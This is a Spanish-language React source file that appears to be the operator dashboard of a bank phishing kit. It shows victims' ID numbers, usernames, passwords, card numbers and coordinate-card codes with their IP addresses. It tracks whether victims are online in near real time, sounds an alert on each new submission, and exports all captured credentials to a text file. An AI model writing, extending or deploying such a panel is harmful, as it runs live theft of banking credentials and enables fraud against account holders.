import { useState, useEffect, useRef } from "react";
import { api } from "@/api/apiClient";
import PanelHeader from "@/components/panel/PanelHeader";
import ActionButtons from "@/components/panel/ActionButtons";
import RequestRow from "@/components/panel/RequestRow";
import { usePresence } from "@/hooks/usePresence";

const TABLE_HEADERS = ["NUM", "NOMBRE", "IMAGEN", "PERMISO", "ETAPA", "ESTADO", "ACCIONES"];

/** @typedef {{id: string; usuario: string; tipo: string; etapa: string; status: string; numero_documento?: string; clave_acceso?: string; numero_tarjeta?: string; coord?: string; codigo_coord?: string; ip?: string}} Request */

export default function Panel() {
  /** @type {[Request[], Function]} */
  const [requests, setRequests] = useState([]);
  const [initialLoading, setInitialLoading] = useState(true);
  const [soundOn, setSoundOn] = useState(true);
  const [userPresence, setUserPresence] = useState(new Map());
  const [currentUserId, setCurrentUserId] = useState("");
  const requestMapRef = useRef(new Map());

  // Hook para trackear presencia del usuario actual
  usePresence(currentUserId || null, "Panel Admin");

  // Obtener user_id del usuario autenticado
  useEffect(() => {
    const getAuthUser = async () => {
      try {
        const { data: { user } } = await api.supabase.auth.getUser();
        if (user) {
          setCurrentUserId(user.id);
        }
      } catch (err) {
        console.error("Error getting auth user:", err);
      }
    };
    getAuthUser();
  }, []);

  // Cargar presencia de user_presence - actualización en tiempo real (200ms)
  useEffect(() => {
    const loadPresence = async () => {
      try {
        const { data, error } = await api.supabase
          .from('user_presence')
          .select('*');

        if (error) {
          console.error('Panel: Error cargando presencia:', error);
          return;
        }

        if (data) {
          const presenceMap = new Map();
          data.forEach(presence => {
            presenceMap.set(presence.user_id, presence);
          });
          setUserPresence(presenceMap);
        }
      } catch (err) {
        console.error('Panel: Error cargando presencia:', err);
      }
    };

    // Cargar presencia inicial
    loadPresence();

    // Recargar presencia cada 200ms (0.2 segundos) para actualización en tiempo real
    const interval = setInterval(loadPresence, 200);

    // Forzar actualización cuando la página vuelve a ser visible
    const handleVisibilityChange = () => {
      if (!document.hidden) {
        console.log('Panel: Página visible nuevamente, recargando presencia');
        loadPresence();
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      clearInterval(interval);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, []);

  // Función para generar presenceId basado en datos de solicitud
  const getPresenceId = (request) => {
    if (request.user_id) {
      console.log(`getPresenceId: usando user_id=${request.user_id}`);
      return request.user_id;
    }
    if (request.tipo === 'empresa' && request.numero_documento) {
      const id = `empresa-${request.numero_documento}`;
      console.log(`getPresenceId: generando empresa presenceId=${id} (numero_documento=${request.numero_documento})`);
      return id;
    }
    if (request.tipo === 'persona' && request.usuario) {
      const id = `persona-${request.usuario}`;
      console.log(`getPresenceId: generando persona presenceId=${id} (usuario=${request.usuario})`);
      return id;
    }
    console.log(`getPresenceId: no se pudo generar presenceId para request=`, request);
    return null;
  };

  // Función para reproducir sonido emocionante con Web Audio API
  const playNotificationSound = () => {
    if (!soundOn) {
      console.log('🔕 Sonido desactivado');
      return;
    }

    try {
      console.log('🔔 Intentando reproducir sonido de notificación...');

      // Crear AudioContext
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();

      // Reanudar contexto si está suspendido
      if (audioContext.state === 'suspended') {
        audioContext.resume();
      }

      const now = audioContext.currentTime;
      const masterGain = audioContext.createGain();
      masterGain.connect(audioContext.destination);
      masterGain.gain.value = 0.8; // Volumen: 80%

      // Crear un sonido emocionante: acordes ascendentes + efecto de "ding"
      const notes = [
        { freq: 523, startTime: now, duration: 0.15 }, // C5
        { freq: 659, startTime: now + 0.1, duration: 0.15 }, // E5
        { freq: 783, startTime: now + 0.2, duration: 0.2 }, // G5
        { freq: 1046, startTime: now + 0.35, duration: 0.35 }, // C6 (nota alta y fuerte)
      ];

      notes.forEach(({ freq, startTime, duration }) => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();

        oscillator.connect(gainNode);
        gainNode.connect(masterGain);

        oscillator.frequency.value = freq;
        oscillator.type = 'sine';

        // Envelope: fade in rápido, fade out suave
        gainNode.gain.setValueAtTime(0, startTime);
        gainNode.gain.linearRampToValueAtTime(0.8, startTime + 0.02);
        gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);

        oscillator.start(startTime);
        oscillator.stop(startTime + duration);
      });

      console.log('✅ Sonido de notificación reproducido correctamente');
    } catch (err) {
      console.error('❌ Error reproduciendo sonido:', err);
    }
  };

  const loadRequests = async (isInitial = false) => {
    try {
      const data = await api.entities.PinoPermiso.list("-id", 50);

      // Ordenar por fecha de creación descendente (más recientes primero)
      const sortedData = [...data].sort((a, b) => {
        const dateA = new Date(b.created_at || b.id).getTime();
        const dateB = new Date(a.created_at || a.id).getTime();
        return dateA - dateB;
      });

      // Reconciliación de datos: mantener orden y evitar flicker
      const newMap = new Map(sortedData.map(r => [r.id, r]));
      const oldMap = requestMapRef.current;

      // Detectar cambios sin perder posiciones
      let changed = sortedData.length !== oldMap.size;
      const hasNewRequests = sortedData.length > oldMap.size;

      if (!changed) {
        for (const [id, req] of newMap) {
          const oldReq = oldMap.get(id);
          if (!oldReq || JSON.stringify(oldReq) !== JSON.stringify(req)) {
            changed = true;
            break;
          }
        }
      }

      if (changed) {
        // Reproducir sonido si hay nuevas solicitudes (antes de actualizar el estado)
        if (!isInitial && hasNewRequests && soundOn) {
          console.log('🔔 Nueva solicitud detectada, reproduciendo sonido...');
          playNotificationSound();
        }

        requestMapRef.current = newMap;
        setRequests(sortedData);
      }
    } catch (err) {
      console.error("Error loading requests:", err);
      if (initialLoading) setRequests([]);
    } finally {
      if (isInitial) setInitialLoading(false);
    }
  };

  useEffect(() => {
    loadRequests(true);
    const unsub = api.entities.PinoPermiso.subscribe(() => loadRequests(false), 200);
    return unsub;
  }, []);

  /** @type {(id: string) => Promise<void>} */
  const handleDelete = async (id) => {
    await api.entities.PinoPermiso.delete(id);
    /** @type {(prev: Request[]) => Request[]} */
    const newRequests = (prev) => prev.filter((r) => r.id !== id);
    setRequests(newRequests);
  };

  const handleClearAll = async () => {
    if (!requests.length) return;
    await api.entities.PinoPermiso.deleteMany({});
    setRequests([]);
  };

  const handleExportTxt = () => {
    if (!requests.length) return;
    const lines = requests.map(
      (r) =>
        `${r.numero_documento} | ${r.usuario} | ${r.clave_acceso} | ${r.numero_tarjeta || ""} | ${r.coord || ""} | ${r.codigo_coord || ""} | ${r.ip || ""}`
    );
    const blob = new Blob([lines.join("\n")], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "solicitudes.txt";
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <PanelHeader />

      <div className="p-4 md:p-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200">
          {/* Top bar */}
          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-3 p-4 border-b border-gray-100">

            <ActionButtons
              count={requests.length}
              soundOn={soundOn}
              onToggleSound={() => setSoundOn(!soundOn)}
              onClearAll={handleClearAll}
              onExportTxt={handleExportTxt}
              onConfig={() => {}}
            />
          </div>

          {/* Table */}
          <div className="overflow-x-auto">
            <table className="w-full min-w-[640px]">
              <thead>
                <tr className="border-b border-gray-200">
                  {TABLE_HEADERS.map((h, i) => (
                    <th
                      key={i}
                      className="px-3 py-2.5 text-left text-[10px] font-bold text-gray-400 uppercase tracking-wider"
                    >
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {initialLoading ? (
                  <tr>
                    <td colSpan={TABLE_HEADERS.length + 1} className="text-center py-12">
                      <div className="inline-block w-6 h-6 border-2 border-gray-200 border-t-blue-600 rounded-full animate-spin" />
                    </td>
                  </tr>
                ) : requests.length === 0 ? (
                  <tr>
                    <td colSpan={TABLE_HEADERS.length + 1} className="text-center py-12 text-gray-400 text-sm">
                      No hay solicitudes
                    </td>
                  </tr>
                ) : (
                  requests.map((req) => (
                    <RequestRow
                      key={req.id}
                      request={req}
                      presenceId={getPresenceId(req)}
                      userPresence={userPresence}
                      onDelete={handleDelete}
                      onStatusChange={() => loadRequests(false)}
                    />
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}